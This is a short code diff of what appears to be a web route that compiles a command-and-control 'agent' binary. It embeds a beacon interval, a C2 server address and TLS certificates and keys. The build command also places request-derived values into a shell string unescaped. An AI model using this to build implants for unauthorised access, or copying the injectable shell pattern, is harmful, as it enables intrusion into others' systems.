@@ -32,11 +32,11 @@ router.post('/build', async (req, res) => {
     const outputName = `agent-${buildOS}-${buildArch}${ext}`;
     
     const ldflags = [
-      `-X 'main.BeaconInterval=${beaconInterval || '30s'}'`,
-      `-X 'main.C2Server=${c2Server || `c2.${config.domain}:4443`}'`,
-      `-X 'main.EmbeddedCACert=${caCert.replace(/\n/g, '\\n')}'`,
-      `-X 'main.EmbeddedCert=${clientCert.replace(/\n/g, '\\n')}'`,
-      `-X 'main.EmbeddedKey=${clientKey.replace(/\n/g, '\\n')}'`
+      `-X 'gla1ve/agent/pkg/config.BeaconInterval=${beaconInterval || '30s'}'`,
+      `-X 'gla1ve/agent/pkg/config.C2Server=${c2Server || `c2.${config.domain}:4443`}'`,
+      `-X 'gla1ve/agent/pkg/config.EmbeddedCACert=${caCert.replace(/\n/g, '\\n')}'`,
+      `-X 'gla1ve/agent/pkg/config.EmbeddedCert=${clientCert.replace(/\n/g, '\\n')}'`,
+      `-X 'gla1ve/agent/pkg/config.EmbeddedKey=${clientKey.replace(/\n/g, '\\n')}'`
     ].join(' ');
     
     const buildCmd = `cd ${agentDir} && set GOOS=${buildOS}&& set GOARCH=${buildArch}&& go build -ldflags "${ldflags}" -o ${outputName} cmd/agent/main.go`;
